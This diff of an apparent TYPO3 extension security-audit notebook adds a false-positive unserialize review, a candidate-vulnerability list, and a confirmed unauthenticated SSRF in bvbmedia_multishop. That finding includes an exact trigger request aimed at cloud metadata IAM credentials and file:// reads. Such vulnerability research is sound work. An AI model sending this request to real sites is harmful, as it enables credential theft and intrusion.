@@ -906,6 +906,46 @@ The extension is current (TYPO3 v13) and actively maintained, not the vulnerable
 ## Conclusion
 The download/dump path and the `FalSecuredownloadFileTreeState` eID were traced end-to-end. Access control is enforced on every file-serving sink, file identity is by integer UID (no traversal), and tokens are encryptionKey-keyed HMACs (not forgeable). **No unpatched pre-auth arbitrary file read exists in v6.0.3.** Only the low/informational items F1–F3 above are concrete.
 
+### bitpatroon_bitpatroon_support_functions
+
+#### Audit — bitpatroon_support_functions / CookieService unserialize sinks
+
+**Verdict: MITIGATED (data-only unserialize) — AND no pre-auth caller.** Double-negative: both the object-injection primitive and the reachability are absent.
+
+- Extension version: **10.3** (`ext_emconf.php`, `'version' => '10.3'`). No TYPO3 version constraint declared (`depends` empty).
+- File: `bitpatroon_support_functions/Classes/Service/CookieService.php`
+- Namespace: `BPN\SupportFunctions\Service\CookieService`
+
+## The three sinks
+
+All three `unserialize()` calls pass the PHP7+ `['allowed_classes' => false]` flag, which downgrades them to **data-only** deserialization — no `__wakeup`/`__destruct` gadget can be instantiated. POP-chain object injection is not possible.
+
+| # | Line | Argument | Attacker-controlled? | Mitigation |
+|---|------|----------|----------------------|------------|
+| 1 | **CookieService.php:81** | `unserialize($decodedMessage, ['allowed_classes' => false])` where `$decodedMessage = base64_decode($_COOKIE[$cookieName])` | Yes — raw `$_COOKIE` value | `allowed_classes=>false` ✅ |
+| 2 | **CookieService.php:106** | `unserialize($attributes[self::FIELD_CONTENT], ['allowed_classes' => false])` — `FIELD_CONTENT` is an inner serialized blob taken from the same base64 cookie | Yes — cookie-derived | `allowed_classes=>false` ✅ |
+| 3 | **CookieService.php:122** | `unserialize($decodedMessage, ['allowed_classes' => false])` in `markCookieUsed()`, again `base64_decode($_COOKIE[$cookieName])` | Yes — raw `$_COOKIE` value | `allowed_classes=>false` ✅ |
+
+Input source is genuinely attacker-controlled (`$_COOKIE[$cookieName]`, lines 75, 112), so the CodeQL taint is real — but the sink is neutralized.
+
+## Reachability
+
+The three methods (`getSecureCookieData`, `markCookieUsed`) are a **library, never wired to any request path**:
+
+- Corpus-wide grep for `getSecureCookieData` / `::setSecureCookie` / the `BPN\SupportFunctions\Service\CookieService` FQCN finds **only the unit test** (`Tests/Unit/Service/CookieServiceTests.php`) as a caller. No production caller anywhere in the ~thousands-of-extensions corpus.
+- The extension **does** register a frontend middleware — `Configuration/RequestMiddlewares.php` → `BPN\SupportFunctions\Middleware\NoCachePrefixMiddleware` — but that middleware only rewrites `/nc` URL prefixes to `no_cache=1`. It does **not** touch `CookieService`, `$_COOKIE`, or `unserialize`.
+- No eID, no hook, no plugin, no `ext_localconf.php` (absent) references CookieService.
+
+So even if the flag were absent, no pre-auth (or any) frontend path invokes these methods within this extension.
+
+## Note on cookie integrity
+
+The read path further validates a HMAC-style hash (`VerificationCodeService::isValid`, line 90) keyed by a hardcoded `SECRET` before honoring `FIELD_CONTENT`. Irrelevant here since the sink is already data-only, but it means sink #2 (line 106) is additionally gated behind a signature check on the default `$mustBeValid=true` path.
+
+## Conclusion
+
+Not exploitable. The object-injection reading is **mitigated** by `allowed_classes=>false` at all three sites, and independently there is **no pre-auth caller** (no caller at all outside tests). No request or cookie triggers a POP chain. FALSE POSITIVE for object injection.
+
 ### bitpatroon_bpn_request_access
 
 #### Security Audit — `bpn_request_access` (Bitpatroon "BPN Request access")
@@ -1056,6 +1096,89 @@ for the reviewed classes. Assessment is based on source review of v1.2.0.
 No path traversal, unrestricted upload, or missing-auth vulnerability. Security
 depends on unchanged TYPO3 core file-upload controls (fileDenyPattern, FAL
 permissions, Form Framework HMAC), which this extension correctly reuses.
+
+### bvbmedia_bvbmedia_multishop
+
+#### Audit — bvbmedia_multishop / SSRF in file_get_contents wrapper
+
+**Verdict: CONFIRMED pre-auth SSRF** (arbitrary-host, incl. `file://` local read). A degraded no-HPP variant additionally lets any guest force re-fetch of admin-configured import URLs.
+
+- Extension version: **5.1.110** (`ext_emconf.php`). Constraints: TYPO3 `6.2.5-7.9.99`, PHP `5.3.15-5.6.99`. Abandoned; same corpus already confirmed pre-auth SQLi.
+- Frontend plugin: `tx_multishop_pi1` (registered `addPItoST43`, `list_type`), `pi_checkCHash = false` (no cHash/CSRF gate on the plugin).
+
+## The sink
+
+`mslib_fe::file_get_contents($filename)` — `pi1/classes/class.mslib_fe.php:10351` — is a fetch wrapper. For any `$filename` with a URL scheme it runs:
+
+- `curl_init($filename)` — **class.mslib_fe.php:10385**
+- `curl_setopt(..., CURLOPT_SSL_VERIFYPEER, false)` — 10386
+- `curl_exec($ch)` — **class.mslib_fe.php:10400**
+- on 301/302: `file_get_contents($filename)` — 10404
+
+(The CodeQL report's `:10392`/`:10393` are the `CURLOPT_CONNECTTIMEOUT`/`CURLOPT_TIMEOUT` lines of the same curl block — minor line drift vs. this revision; same wrapper function. `curl_exec` is the effective sink at 10400.) No host allow-list, no scheme restriction; `curl` here also honors `file://`.
+
+## Attacker input → sink chain
+
+Caller: **`scripts/admin_pages/admin_import.php:469`**
+```php
+$file_content = mslib_fe::file_get_contents($this->post['file_url']);   // $this->post = _POST()
+```
+`$this->post = GeneralUtility::_POST()` and `$this->get = GeneralUtility::_GET()` (raw superglobals — `pi1/class.tx_multishop_pi1.php:97-98`). So `file_url` is a raw POST field. The only filter before the sink is `if (strstr($this->post['file_url'], "../")) die();` (admin_import.php:461) — blocks the `../` substring only; `http://169.254.169.254/…`, `http://127.0.0.1:port/`, `file:///etc/passwd` all pass.
+
+### Pre-auth reachability
+
+The multishop "admin panel" is a frontend plugin flow (`admin_main` → `scripts/admin_pages/core.php`). The guest gate is at **core.php:137**:
+```php
+if (!$this->ADMIN_USER) {
+    switch ($this->ms['page']) {
+        case 'admin_import':
+        case 'admin_customer_import':
+            if ($this->get['action'] != 'run_job') { exit(); }   // guests ALLOWED when action=run_job
+            break;
+        default: exit();
+    }
+}
+```
+The developers deliberately let **unauthenticated** users into `admin_import` when `action=run_job` (comment: *"Only allow running the import as a guest user (through cronjob)"*). Dispatch then requires the script when `is_numeric($this->get['job_id'])` (core.php ~376) — and `$this->get` is **pure `$_GET`**, so a guest simply supplies a numeric `job_id` in the query string; no secret `code` and no existing job row is required to load `admin_import.php`.
+
+Inside admin_import.php, the guest-URL sink lives in the `product-import-preview` branch:
+```php
+} elseif ($this->post['action'] == 'product-import-preview' or (is_numeric($_REQUEST['job_id']) and $_REQUEST['action']=='edit_job')) {  // :434
+    if (is_numeric($_REQUEST['job_id'])) {           // :436  — loads DB job, OVERWRITES $this->post
+        ... $this->post = $data[1]; ...
+    }
+    ...
+    } elseif ($this->post['file_url']) {             // :460 — guest POST value survives if :436 skipped
+        if (strstr($this->post['file_url'], "../")) die();   // :461
+        $file_content = mslib_fe::file_get_contents($this->post['file_url']);  // :469  SINK
+```
+
+The one obstacle is line 436: if `$_REQUEST['job_id']` is numeric it reloads the stored job and overwrites `$this->post` (wiping the guest `file_url`). The gap: **core.php checks `$this->get['job_id']` (pure GET) while admin_import.php checks `$_REQUEST['job_id']`.** With PHP's default `request_order=GP`, POST overrides GET in `$_REQUEST`. Sending `job_id` numeric in GET and non-numeric in POST satisfies core.php's gate yet skips the line-436 overwrite — leaving `$this->post['file_url']` fully attacker-controlled into the sink.
+
+### Exact request to trigger
+
+```
+POST /index.php?id=<shop_pid>&type=2003&tx_multishop_pi1[page_section]=admin_import&action=run_job&job_id=1 HTTP/1.1
+Host: victim
+Content-Type: application/x-www-form-urlencoded
+
+action=product-import-preview&job_id=x&file_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+- GET `job_id=1` (numeric) → passes core.php `is_numeric($this->get['job_id'])` → `require(admin_import.php)`.
+- GET `action=run_job` → passes the guest gate at core.php:137.
+- POST `action=product-import-preview` → enters branch at :434.
+- POST `job_id=x` → `$_REQUEST['job_id']` non-numeric (POST wins) → skips :436 overwrite.
+- POST `file_url=…` → reaches sink at :469 → server-side `curl_exec` to the attacker-chosen URL. Response body is fetched (and, if it parses as an import feed, partly reflected/stored), so this is a read/exfil-capable SSRF; `file://` gives local file read.
+
+**Auth level: unauthenticated (guest).** No FE login, no admin usergroup, no cHash, no CSRF token. `$this->ADMIN_USER` is false throughout.
+
+### Degraded variant (no HPP dependency)
+
+Even ignoring the GET/`$_REQUEST` split: a guest sending only GET `job_id=<n>` for an existing job triggers the line-436/1078 load and re-fetches the **admin-configured** URL of import job `n` (`run_job` branch also at admin_import.php:1006 → :1105 `file_get_contents($this->post['file_url'])`). Host is admin-chosen there (weaker), but it is still an unauthenticated trigger of a server-side outbound fetch. The full-strength finding is the arbitrary-host chain above.
+
+## Conclusion
+
+CONFIRMED unauthenticated SSRF. Attacker-controlled URL (`_POST['file_url']`) flows to `curl_exec`/`file_get_contents` in the `mslib_fe::file_get_contents()` wrapper (class.mslib_fe.php:10400/10404) via `scripts/admin_pages/admin_import.php:469`, reachable pre-auth through the `tx_multishop_pi1[page_section]=admin_import&action=run_job` guest path. Only guard is a `../` substring check — no host/scheme validation. Version 5.1.110.
 
 ### bvbmedia_multishop
 
@@ -4821,7 +4944,7 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 
 ## CodeQL mass-scan candidates (intra-extension, all 3350 exts)
 ```
-# 872 raw -> 666 after noise filter
+# 886 raw -> 680 after noise filter
 
 [CRIT] Code injection       erecht24_er24-rechtstexte    Classes/Controller/AjaxController.php:131
 [XSS ] Reflected XSS        caretaker_caretaker_instance Classes/Controller/EidController.php:22
@@ -4854,6 +4977,7 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 [CRIT] SQL injection        mia3_mia3_categories         Classes/Controller/CategoryController.php:48
 [CRIT] Server-side request  mittwald_typo3_forum         Classes/Controller/AbstractController.php:207
 [CRIT] Server-side request  mittwald_typo3_forum         Classes/Controller/AbstractController.php:211
+[CRIT] SQL injection        netresearch_nr-vault         Classes/Controller/AuditController.php:95
 [XSS ] Reflected XSS        ehaerer_eh-bootstrap         Classes/Eid/ExtbaseDispatcher.php:155
 [XSS ] Reflected XSS        bytebuilders_t3clickmark     Classes/Middleware/InjectWidgetMiddleware.php:85
 [XSS ] Reflected XSS        jambagecom_taxajax           Classes/Middleware/XajaxHandler.php:117
@@ -4862,5 +4986,4 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 [XSS ] Reflected XSS        jvelletti_jvchat             Classes/Eid/Chat.php:980
 [XSS ] Reflected XSS        jvelletti_jvchat             Classes/Eid/JvchatEid.php:41
 [XSS ] Reflected XSS        jvelletti_jvchat             Classes/Eid/JvchatEid.php:48
-[CRIT] Code injection       adgrafik_fal-ftp             Resources/Private/Script/.FalFtpRemoteService.php:18
 ```
